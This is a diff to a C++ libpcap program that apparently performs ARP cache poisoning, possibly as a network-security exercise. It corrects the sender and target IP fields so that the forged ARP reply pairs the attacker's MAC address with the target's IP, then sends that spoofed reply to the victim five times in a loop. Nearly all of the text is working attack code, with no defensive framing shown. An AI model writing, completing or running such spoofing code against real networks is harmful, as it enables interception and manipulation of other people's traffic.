@@ -58,12 +58,12 @@ Mac TaMac(pcap_t* pcap, const char* dev, Mac Mymac, Ip senderIp, Ip targetIp) { 
 		if (res == -1) break;
 
 		EthArpPacket* recvPacket = (EthArpPacket*)reply;
-
+	
 		if (recvPacket->eth_.type_ != htons(EthHdr::Arp)) continue;
 		if (recvPacket->arp_.op_ != htons(ArpHdr::Reply)) continue;
 		if (recvPacket->arp_.sip_ != htonl(senderIp)) continue;
 		if (recvPacket->arp_.tip_ != htonl(targetIp)) continue;
-
+		
 		return recvPacket->arp_.smac_;
 
 	}
@@ -98,7 +98,7 @@ int main(int argc, char* argv[]) {
 		Ip targetIP(targetIp);
 
 		EthArpPacket packet;
-		Mac taMac = TaMac(pcap, dev, myMac, senderIP, targetIP);
+		Mac taMac = TaMac(pcap, dev, myMac, targetIP, senderIP);
 		
 
 		packet.eth_.dmac_ = taMac;
@@ -111,14 +111,18 @@ int main(int argc, char* argv[]) {
 		packet.arp_.pln_ = Ip::Size;
 		packet.arp_.op_ = htons(ArpHdr::Reply);
 		packet.arp_.smac_ = myMac;
-		packet.arp_.sip_ = htonl(Ip(senderIp));
+		packet.arp_.sip_ = htonl(targetIP);
 		packet.arp_.tmac_ = taMac;
-		packet.arp_.tip_ = htonl(Ip(targetIp));
+		packet.arp_.tip_ = htonl(senderIP);
 
+
+		for(int i =0; i < 5; i++){
 		int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 		if (res != 0) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
 		}
 	}
+
+}
 	pcap_close(pcap);
 }
